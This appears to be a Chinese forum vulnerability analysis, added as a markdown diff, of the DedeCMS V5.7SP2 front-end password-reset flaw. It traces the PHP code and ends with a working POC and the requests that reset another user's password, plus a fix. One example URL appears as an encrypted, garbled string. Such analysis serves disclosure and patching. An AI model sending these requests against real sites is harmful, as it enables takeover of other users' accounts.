@@ -1,0 +1,248 @@
+
+# [原创][投稿]dedecms前台修改任意用户密码漏洞分析
+
+## 前言
+
+- 漏洞公布时间: `2018/01/10`
+- 影响版本: `V5.7SP2`正式版(`2018-01-09`)之前所有版本
+
+## 漏洞说明
+
+这个漏洞的前提是需要开启用户注册的功能，造成的危害是能够修改前台部分用户的密码，这部分用户是那些没有设置密保问题的用户。前台管理员密码虽然也没有设置密保问题，但是由于dedecms本身的功能即使修改密码也是无法登录的。
+
+dedecms重置密码的原理是给重置密码的用户发送一个重置密码的链接。那么在进行重置密码时，修改为其他的用户就能够修改其他用户的密码了，所以本质上来说这是一个越权漏洞。
+
+## 漏洞分析
+
+假设dedecms已经开启了用户注册的功能，用户重置密码的的URL是为`<mark class="encrypted">9e2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4G2j5$3q4D9K9r3!0K6N6q4)9J5c8X3#2W2L8h3u0W2M7W2)9J5c8Y4u0W2M7$3g2@1M7r3q4K6M7%4N6G2M7X3c8Q4x3X3g2H3K9s2m8Q4y4U0m8Q4c8e0y4Q4z5o6m8Q4z5o6u0Q4c8e0g2Q4b7f1k6Q4b7U0W2Q4c8e0g2Q4b7V1q4Q4z5e0c8Q4c8e0c8Q4b7V1q4Q4z5p5g2Q4c8e0k6Q4b7V1q4Q4z5e0m8Q4c8e0N6Q4b7e0m8Q4z5o6q4Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0c8Q4b7V1c8Q4z5p5c8Q4c8e0N6Q4b7V1c8Q4b7f1g2Q4c8e0k6Q4z5e0S2Q4b7f1k6Q4y4U0m8E0k6h3#2T1k6i4u0Q4x3V1k6J5k6i4y4W2N6s2m8S2M7%4y4%4L8%4u0V1i4K6u0W2M7r3S2H3i4K6j5H3i4@1f1K6i4K6R3H3i4K6R3J5</mark>`
+
+### safequestion分析
+
+在`member/resetpassword.php`中存在三个重置密码的方法，分别是`getped`、`safequestion`、`getpasswd`。而本次的漏洞与`safequestion`有关。
+
+分析`safequestion`方法代码：
+
+```PHP
+else if($dopost == "safequestion")
+{
+$mid = preg\_replace("#[^0-9]#", "", $id);
+$sql = "SELECT safequestion,safeanswer,userid,email FROM #@\_\_member WHERE mid = '$mid'";
+$row = $db->GetOne($sql);
+if(empty($safequestion)) $safequestion = '';
+if(empty($safeanswer)) $safeanswer = '';
+if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)
+{
+sn($mid, $row['userid'], $row['email'], 'N');
+exit();
+}
+else
+{
+ShowMsg("对不起，您的安全问题或答案回答错误","-1");
+exit();
+}
+}
+```
+
+其中有几个关键的验证，如`empty($safequestion)`、`empty($safeanswer)`、`if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)`。首先我们需要知道，一个没有设置密保问题的用户，默认的`safequestion`和`safeanswer`结果。
+
+```SQL
+mysql> SELECT safequestion,safeanswer,userid,email FROM dede\_member WHERE mid='1';
++--------------+------------+--------+-------+
+| safequestion | safeanswer | userid | email |
++--------------+------------+--------+-------+
+| 0 | | admin | |
++--------------+------------+--------+-------+
+1 row in set (0.00 sec)
+```
+
+默认情况下的`safequestion`为0,`safeanswer`为空。那么如何通过这个验证呢？如果我们传输的`safequestion`为0，而`empty($safequestion)`为True。此时我们需要利用到php的隐式类型转换，即PHP在进行类型比较、类型判断时会自动进行一些类型的转换，如下：
+
+```PHP
+var\_dump(empty(0)); // true
+var\_dump(empty('0')); // true
+var\_dump(empty('0.0')); // false
+var\_dump(0.0==0); // true
+var\_dump('0.0'==0); // true
+var\_dump(null==''); // true
+```
+
+**所以我们设置我们输入的safequestion为0.0，safeanswer为空就可以绕过这个验证**，此时`empty($safeanswer)为True`，`$row['safequestion'] == $safequestion也为True`,而数据中查询出来的`safeanswer`本身就为NULL，所以我们设置为空，就可以通过验证。之后程序进入`sn($mid, $row['userid'], $row['email'], 'N');`中。
+
+**所以这个地方重置的仅仅是那些没有设置密保问题的用户，因为只有这些用户他们的safequestion才是空**
+
+### sn函数分析
+
+跟踪进入到`member/inc/inc\_pwd\_functions.php:sn()`中，
+
+```PHP
+function sn($mid,$userid,$mailto, $send = 'Y')
+{
+global $db;
+$tptim= (60\*10);
+$dtime = time();
+$sql = "SELECT \* FROM #@\_\_pwd\_tmp WHERE mid = '$mid'";
+$row = $db->GetOne($sql);
+if(!is\_array($row))
+{
+//发送新邮件；
+newmail($mid,$userid,$mailto,'INSERT',$send);
+}
+//10分钟后可以再次发送新验证码；
+elseif($dtime - $tptim > $row['mailtime'])
+{
+newmail($mid,$userid,$mailto,'UPDATE',$send);
+}
+//重新发送新的验证码确认邮件；
+else
+{
+return ShowMsg('对不起，请10分钟后再重新申请', 'login.php');
+}
+}
+```
+
+进入到`sn()`函数之后，会执行`SELECT \* FROM #@\_\_pwd\_tmp WHERE mid = '$mid'`,此条SQL语句查询的是`dede\_pwd\_tmp`,此表存储的就是重置密码的临时KEY。由于此时没有重置密码，所以没有对应此用户的记录。
+
+![](upload/attach/201801/740345\_gw7lmtjs648v29h.jpg)
+
+进入到第一个判断`newmail($mid,$userid,$mailto,'INSERT',$send);`中
+
+### newmail函数分析
+
+追踪进入到`member/inc/inc\_pwd\_functions.php:newmail()`中
+
+```PHP
+function newmail($mid, $userid, $mailto, $type, $send)
+{
+global $db,$cfg\_adminemail,$cfg\_webname,$cfg\_basehost,$cfg\_memberurl;
+$mailtime = time();
+$randval = random(8);
+$mailtitle = $cfg\_webname.":密码修改";
+$mailto = $mailto;
+$headers = "From: ".$cfg\_adminemail."\r\nReply-To: $cfg\_adminemail";
+$mailbody = "亲爱的".$userid."：\r\n您好！感谢您使用".$cfg\_webname."网。\r\n".$cfg\_webname."应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：".$randval." 请于三天内登陆下面网址确认修改。\r\n".$cfg\_basehost.$cfg\_memberurl."/resetpassword.php?dopost=getpasswd&id=".$mid;
+if($type == 'INSERT')
+{
+$key = md5($randval);
+$sql = "INSERT INTO `#@\_\_pwd\_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid', '$key', '$mailtime');";
+if($db->ExecuteNoneQuery($sql))
+{
+if($send == 'Y')
+{
+sendmail($mailto,$mailtitle,$mailbody,$headers);
+return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000');
+} else if ($send == 'N')
+{
+return ShowMsg('稍后跳转到修改页', $cfg\_basehost.$cfg\_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval);
+}
+}
+else
+{
+return ShowMsg('对不起修改失败，请联系管理员', 'login.php');
+}
+}
+```
+
+进入到`$type == 'INSERT'`中，生成一个临时KEY,`$key = md5($randval);`,然后插入到数据库中，`$sql = "INSERT INTO #@\_\_pwd\_tmp (mid ,membername ,pwd ,mailtime)VALUES ('$mid', '$userid', '$key', '$mailtime');";`。接下来根据参数`$send`的值判断是将重置密码的链接通过邮箱发送还是直接跳转。这个参数最开始是在`$dopost == "safequestion"`中设置的，默认值是`N`，那么就会将对应id的密码返回。
+
+![](upload/attach/201801/740345\_wgw7lcc7ptwrhh5.jpg)
+
+拿到重置链接直接在浏览器中访问就可以修改此id对应用户的密码了。
+
+![](upload/attach/201801/740345\_4xuhk9jqd2u7gya.jpg)
+
+## 重置密码
+
+重置密码发送的请求如下：
+
+```
+URL:http://localhost/member/resetpassword.php
+POST:dopost=getpasswd&setp=2&id=3&userid=test02&key=K5TrsKQB&pwd=123456&pwdok=123456
+```
+
+其中的`pwd`和`pwdok`是我设置的重置密码。
+
+此重置密码的请求就会进入到`member/resetpassword.php`的`$dopost == "getpasswd"`中
+
+```PHP
+else if($dopost == "getpasswd")
+{
+//修改密码
+if(empty($id))
+{
+ShowMsg("对不起，请不要非法提交","login.php");
+exit();
+}
+$mid = preg\_replace("#[^0-9]#", "", $id);
+$row = $db->GetOne("SELECT \* FROM #@\_\_pwd\_tmp WHERE mid = '$mid'");
+if(empty($row))
+{
+ShowMsg("对不起，请不要非法提交","login.php");
+exit();
+}
+if(empty($setp))
+{
+$tptim= (60\*60\*24\*3);
+$dtime = time();
+if($dtime - $tptim > $row['mailtime'])
+{
+$db->executenonequery("DELETE FROM `#@\_\_pwd\_tmp` WHERE `md` = '$id';");
+ShowMsg("对不起，临时密码修改期限已过期","login.php");
+exit();
+}
+require\_once(dirname(\_\_FILE\_\_)."/templets/resetpassword2.htm");
+}
+elseif($setp == 2)
+{
+if(isset($key)) $pwdtmp = $key;
+$sn = md5(trim($pwdtmp));
+if($row['pwd'] == $sn)
+{
+if($pwd != "")
+{
+if($pwd == $pwdok)
+{
+$pwdok = md5($pwdok);
+$sql = "DELETE FROM `#@\_\_pwd\_tmp` WHERE `mid` = '$id';";
+$db->executenonequery($sql);
+$sql = "UPDATE `#@\_\_member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';";
+if($db->executenonequery($sql))
+{
+showmsg('更改密码成功，请牢记新密码', 'login.php');
+exit;
+}
+}
+}
+showmsg('对不起，新密码为空或填写不一致', '-1');
+exit;
+}
+showmsg('对不起，临时密码错误', '-1');
+exit;
+}
+}
+```
+
+进入之后，会进行`$db->GetOne("SELECT \* FROM #@\_\_pwd\_tmp WHERE mid = '$mid'")`查选，因为在重置密码时已经在`dede\_pwd\_tmp`表中保存了记录，所以此时存在数据。
+
+![](upload/attach/201801/740345\_r53f76mpya5exrd.jpg)
+
+之后根据`step`的值为2，进入到更改密码的操作中。更改密码之后会进行`$sn = md5(trim($pwdtmp));if($row['pwd'] == $sn`操作，与数据库的中密码进行校验，校验成功之后，就会执行一下的两条SQL语句：
+
+```PHP
+"DELETE FROM `#@\_\_pwd\_tmp` WHERE `mid` = '$id';" # 删除临时密码表中的数据
+"UPDATE `#@\_\_member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';"; # 更新dede\_memeber中的密码
+```
+
+至此就完整了整个任意用户密码的重置过程。
+
+## POC
+
+这个漏洞的POC也比较的简单，通过`safequestion`方法重置密码即可。
+
+```
+URL:member/resetpassword.php
+POST:dopost=safequestion&safequestion=0.0&safeanswer=&id=用户ID
+```
+
+## 总结
+
+这个漏洞其实并没有使用什么特殊技巧，仅仅是由于程序在校验的时候不严格。所以这个漏洞也很好修复，将`$row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer`中的`==`变为`===`。除此之外，我在调试这个漏洞时发现这个`safequestion`并没有对应到前台的某个操作，所以感觉这个方法一直没有被使用，而这个漏洞刚好利用了这个方法，所以如果不用这个方法的是完全可以删除的，最后就看官方如何修复吧。
